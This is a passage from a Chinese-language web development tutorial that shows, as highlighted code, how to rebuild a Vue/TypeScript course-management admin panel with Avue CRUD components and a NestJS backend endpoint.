class="javascript">    <span class="keyword">async</span> remove(row) &#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> <span class="keyword">this</span>.$confirm(<span class="string">"是否确认删除?"</span>);</span></span><br><span class="line"><span class="actionscript">      &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.delete(<span class="string">`courses/<span class="subst">$&#123;row._id&#125;</span>`</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"删除成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    created() &#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>使用<a href="https://avuejs.com/doc/installation" rel="external nofollow noopener noreferrer" target="_blank">Avue</a>改造 CRUD，先安装 avue，<code>yarn add @smallwei/avue</code>,可以先创建<code>admin\src\plugins\avue.ts</code>,输入下方代码，若报“找不到模块”错误，则到<code>admin\src\packages.d.ts</code>加入下方代码，最后到<code>admin\src\main.ts</code>引入。在<code>admin\src\main.ts</code>,由于使用了 Avue 进行改造，因此，可以去掉 vue-ele-form，代码如下。完成了 avue 的引入，则可以参考<a href="https://avuejs.com/doc/crud/crud-doc" rel="external nofollow noopener noreferrer" target="_blank">Avue 文档</a>来创建<code>admin\src\views\courses\CourseCrud.vue</code>,最后，<code>admin\src\router\index.ts</code>路由也需要改造，代码如下。</li></ul><blockquote><p>admin\src\plugins\avue.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> Avue <span class="keyword">from</span> <span class="string">"@smallwei/avue"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"@smallwei/avue/lib/index.css"</span>;</span><br><span class="line">Vue.use(Avue);</span><br></pre></td></tr></table></figure><blockquote><p>admin\src\packages.d.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="keyword">module</span> "vue-ele-form" &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">const</span> install: <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">any</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于引入了基于js的@smallwei/avue，所以加上这行代码</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">module</span> "@smallwei/avue" &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">const</span> install: <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">any</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>admin\src\main.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">"./App.vue"</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">"./plugins/element"</span>;</span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">"./router"</span>;</span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">"axios"</span>; <span class="comment">// 引入axios</span></span><br><span class="line"><span class="comment">// import EleForm from "vue-ele-form"; // 引入了Avue，因此不需要</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">"./plugins/avue"</span>; <span class="comment">// 引入Avue</span></span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使axios以$http的形式在全局使用，通过创建实例，将axios的请求与服务端地址对接</span></span><br><span class="line">Vue.prototype.$http = axios.create(&#123;</span><br><span class="line">  baseURL: <span class="string">"http://localhost:3000"</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册 vue-ele-form</span></span><br><span class="line"><span class="comment">// Vue.use(EleForm); // 引入了Avue，因此不需要</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App)</span><br><span class="line">&#125;).$mount(<span class="string">"#app"</span>);</span><br></pre></td></tr></table></figure><blockquote><p>admin\src\views\courses\CourseCrud.vue</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">avue-crud</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:data</span>=<span class="string">"data.data"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:option</span>=<span class="string">"option"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-save</span>=<span class="string">"create"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-update</span>=<span class="string">"update"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-del</span>=<span class="string">"remove"</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">avue-crud</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">"ts"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; Vue, Component &#125; <span class="keyword">from</span> <span class="string">"vue-property-decorator"</span>;</span></span><br><span class="line"></span><br><span class="line">  @Component(&#123;&#125;)</span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">CourseList</span> <span class="keyword">extends</span> <span class="title">Vue</span> </span>&#123;</span></span><br><span class="line">    data = &#123;&#125;;</span><br><span class="line">    option = &#123;</span><br><span class="line"><span class="actionscript">      title: <span class="string">"课程管理"</span>,</span></span><br><span class="line">      column: [</span><br><span class="line">        &#123;</span><br><span class="line"><span class="actionscript">          prop: <span class="string">"name"</span>,</span></span><br><span class="line"><span class="actionscript">          label: <span class="string">"课程名称"</span></span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line"><span class="actionscript">          prop: <span class="string">"cover"</span>,</span></span><br><span class="line"><span class="actionscript">          label: <span class="string">"课程封面图"</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> fetch() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="keyword">this</span>.$http.get(<span class="string">"courses"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.data = res.data;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> create(row, done, loading) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.post(<span class="string">"courses"</span>, row);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"创建成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line"><span class="actionscript">      done(); <span class="comment">// 停止加载，关闭弹窗</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> update(row, index, done, loading) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> data = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(row)); <span class="comment">//先把对象转字符串，再把字符串转对象，达到复制row而不影响row的效果。</span></span></span><br><span class="line"><span class="actionscript">      <span class="keyword">delete</span> data.$index; <span class="comment">// update请求会把index作为数据，类似&#123; $index:1,... &#125;发送到接口，因此请求前需要清除该字段</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.put(<span class="string">`courses/<span class="subst">$&#123;row._id&#125;</span>`</span>, data);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"更新成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line"><span class="actionscript">      done(); <span class="comment">// 停止加载，关闭弹窗</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> remove(row) &#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> <span class="keyword">this</span>.$confirm(<span class="string">"是否确认删除?"</span>);</span></span><br><span class="line"><span class="actionscript">      &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.delete(<span class="string">`courses/<span class="subst">$&#123;row._id&#125;</span>`</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"删除成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    created() &#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>admin\src\router\index.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> VueRouter, &#123; RouteConfig &#125; <span class="keyword">from</span> <span class="string">"vue-router"</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes: RouteConfig[] = [</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">"/"</span>,</span><br><span class="line">    component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/Main.vue"</span>), <span class="comment">// 懒加载，加快页面加载速度</span></span><br><span class="line">    children: [</span><br><span class="line">      &#123;</span><br><span class="line">        name: <span class="string">"home"</span>,</span><br><span class="line">        path: <span class="string">"/"</span>,</span><br><span class="line">        component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/Home.vue"</span>)</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        name: <span class="string">"course-crud"</span>,</span><br><span class="line">        path: <span class="string">"/course/list"</span>,</span><br><span class="line">        component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/courses/CourseCrud.vue"</span>)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// &#123;</span></span><br><span class="line">      <span class="comment">//   name: "course-list",</span></span><br><span class="line">      <span class="comment">//   path: "/courses/list",</span></span><br><span class="line">      <span class="comment">//   component: () =&gt; import("../views/courses/CourseList.vue")</span></span><br><span class="line">      <span class="comment">// &#125;,</span></span><br><span class="line">      <span class="comment">// &#123;</span></span><br><span class="line">      <span class="comment">//   name: "course-edit",</span></span><br><span class="line">      <span class="comment">//   path: "/courses/edit/:id", // 在路由带上id作为参数，以确定编辑哪个列表</span></span><br><span class="line">      <span class="comment">//   component: () =&gt; import("../views/courses/CourseEdit.vue"),</span></span><br><span class="line">      <span class="comment">//   props: true // 允许当前路由接受参数</span></span><br><span class="line">      <span class="comment">// &#125;,</span></span><br><span class="line">      <span class="comment">// &#123;</span></span><br><span class="line">      <span class="comment">//   name: "course-create",</span></span><br><span class="line">      <span class="comment">//   path: "/courses/create",</span></span><br><span class="line">      <span class="comment">//   component: () =&gt; import("../views/courses/CourseEdit.vue")</span></span><br><span class="line">      <span class="comment">// &#125;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br></pre></td></tr></table></figure><ul><li>进一步使用 Avue 改造组件，从上述的<code>admin\src\plugins\avue.ts</code>中可知，可以通过改变<code>option</code>的默认值及接口请求地址来提高复用性，该步骤先改变 option，先在服务端的<code>server\apps\admin\src\courses\courses.controller.ts</code>加上 option 的 GET 请求，代码如下。在修改接口请求地址前，需要先改造<code>admin\src\router\index.ts</code>,代码如下。然后为<code>admin\src\views\courses\CourseCrud.vue</code>加上对应请求并将请求地址根据当前页面路由地址动态改变，最终代码如下。</li></ul><blockquote><p>server\apps\admin\src\courses\courses.controller.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Controller, Get &#125; <span class="keyword">from</span> <span class="string">"@nestjs/common"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Crud &#125; <span class="keyword">from</span> <span class="string">"nestjs-mongoose-crud"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Course &#125; <span class="keyword">from</span> <span class="string">"@libs/db/models/course.model"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; InjectModel &#125; <span class="keyword">from</span> <span class="string">"nestjs-typegoose"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ReturnModelType &#125; <span class="keyword">from</span> <span class="string">"@typegoose/typegoose"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ApiUseTags &#125; <span class="keyword">from</span> <span class="string">"@nestjs/swagger"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Crud</span>(&#123;</span><br><span class="line">  model: Course</span><br><span class="line">&#125;)</span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">"courses"</span>)</span><br><span class="line"><span class="meta">@ApiUseTags</span>(<span class="string">"课程"</span>) <span class="comment">// 为其添加分类，作用于swagger</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> CoursesController &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    <span class="meta">@InjectModel</span>(Course) <span class="keyword">private</span> readonly model: ReturnModelType&lt;<span class="keyword">typeof</span> Course&gt;</span></span><br><span class="line"><span class="params">  </span>) &#123;&#125; <span class="comment">// 使用@InjectModel注入模型，最后也可以使用ReturnModelType&lt;typeof Course&gt;定义改模型类型</span></span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">"option"</span>) <span class="comment">// courses的子路由，请求方式为get，即是localhost:3000/courses/option</span></span><br><span class="line">  option() &#123;</span><br><span class="line">    <span class="comment">// 函数名称不影响，类型@Watch()写法</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      title: <span class="string">"课程管理"</span>,</span><br><span class="line">      column: [</span><br><span class="line">        &#123;</span><br><span class="line">          prop: <span class="string">"name"</span>,</span><br><span class="line">          label: <span class="string">"课程名称"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          prop: <span class="string">"cover"</span>,</span><br><span class="line">          label: <span class="string">"课程封面图"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>admin\src\router\index.ts</p></blockquote><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> VueRouter, &#123; RouteConfig &#125; <span class="keyword">from</span> <span class="string">"vue-router"</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes: RouteConfig[] = [</span><br><span class="line">  &#123;</span><br><span class="line">    path: <span class="string">"/"</span>,</span><br><span class="line">    component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/Main.vue"</span>), <span class="comment">// 懒加载，加快页面加载速度</span></span><br><span class="line">    children: [</span><br><span class="line">      &#123;</span><br><span class="line">        name: <span class="string">"home"</span>,</span><br><span class="line">        path: <span class="string">"/"</span>,</span><br><span class="line">        component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/Home.vue"</span>)</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        name: <span class="string">"resource-crud"</span>,</span><br><span class="line">        path: <span class="string">"/:resource/list"</span>, <span class="comment">// :resource 可以被Prop获取到</span></span><br><span class="line">        component: <span class="function"><span class="params">()</span> =&gt;</span> <span class="keyword">import</span>(<span class="string">"../views/courses/CourseCrud.vue"</span>),</span><br><span class="line">        props: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> VueRouter(&#123;</span><br><span class="line">  routes</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router;</span><br></pre></td></tr></table></figure><blockquote><p>admin\src\views\courses\CourseCrud.vue</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 有option.column再显示，即请求接口获取option所需数据再显示 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">avue-crud</span></span></span><br><span class="line"><span class="tag">      <span class="attr">v-if</span>=<span class="string">"option.column"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:data</span>=<span class="string">"data.data"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">:option</span>=<span class="string">"option"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-save</span>=<span class="string">"create"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-update</span>=<span class="string">"update"</span></span></span><br><span class="line"><span class="tag">      @<span class="attr">row-del</span>=<span class="string">"remove"</span></span></span><br><span class="line"><span class="tag">    &gt;</span><span class="tag">&lt;/<span class="name">avue-crud</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">"ts"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> &#123; Vue, Component, Prop &#125; <span class="keyword">from</span> <span class="string">"vue-property-decorator"</span>;</span></span><br><span class="line"></span><br><span class="line">  @Component(&#123;&#125;)</span><br><span class="line"><span class="javascript">  <span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">ResourceList</span> <span class="keyword">extends</span> <span class="title">Vue</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    @Prop(<span class="built_in">String</span>) resource: string;</span></span><br><span class="line"></span><br><span class="line">    data = &#123;&#125;;</span><br><span class="line">    option = &#123;&#125;;</span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> fetch() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="keyword">this</span>.$http.get(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>`</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.data = res.data;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> fetchOption() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="keyword">this</span>.$http.get(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>/option`</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.option = res.data;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> create(row, done, loading) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.post(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>`</span>, row);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"创建成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line"><span class="actionscript">      done(); <span class="comment">// 停止加载，关闭弹窗</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> update(row, index, done, loading) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> data = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(row)); <span class="comment">//先把对象转字符串，再把字符串转对象，达到复制row而不影响row的效果。</span></span></span><br><span class="line"><span class="actionscript">      <span class="keyword">delete</span> data.$index; <span class="comment">// update请求会把index作为数据，类似&#123; $index:1,... &#125;发送到接口，因此请求前需要清除该字段</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">await</span> <span class="keyword">this</span>.$http.put(<span class="string">`<span class="subst">$&#123;<span class="keyword">this</span>.resource&#125;</span>/<span class="subst">$&#123;row._id&#125;</span>`</span>, data);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$message.success(<span class="string">"更新成功"</span>);</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.fetch();</span></span><br><span class="line"><span class="actionscript">      done(); <span class="comment">// 停止加载，关闭弹窗</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">async</span> remove(row) &#123;</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> <span class="keyword">this</span>.$confirm(<span 